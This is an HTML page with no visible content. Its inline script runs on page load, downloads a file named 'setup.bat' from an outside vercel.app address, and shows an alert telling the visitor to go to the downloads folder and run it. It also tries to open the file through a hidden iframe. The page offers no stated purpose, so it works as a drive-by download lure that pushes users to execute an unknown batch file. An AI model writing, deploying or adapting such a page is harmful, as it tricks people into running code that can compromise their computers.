<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Download and Run .bat File</title>
</head>
<body>
  <script>
    async function downloadAndRunBatFile(fileUrl) {
      try {
        const response = await fetch(fileUrl);
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        const blob = await response.blob();
        const file = new File([blob], 'setup.bat', { type: 'application/bat' });
        const url = window.URL.createObjectURL(file);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'setup.bat'; // Provide a default file name for download
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        
        // Alert user to manually run the downloaded .bat file
        alert('File downloaded successfully! Please navigate to your downloads folder and run the "setup.bat" file.');

        // Automatically open the downloaded file using an iframe (may not work in all browsers due to security restrictions)
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        iframe.src = url;
      } catch (error) {
        console.error('Error downloading or executing file:', error);
        alert('Error downloading or executing file. Please try again later.');
      }
    }

    // Call the function with the file URL
    downloadAndRunBatFile('https://dd-xi-five.vercel.app/setup.bat');
  </script>
</body>
</html>
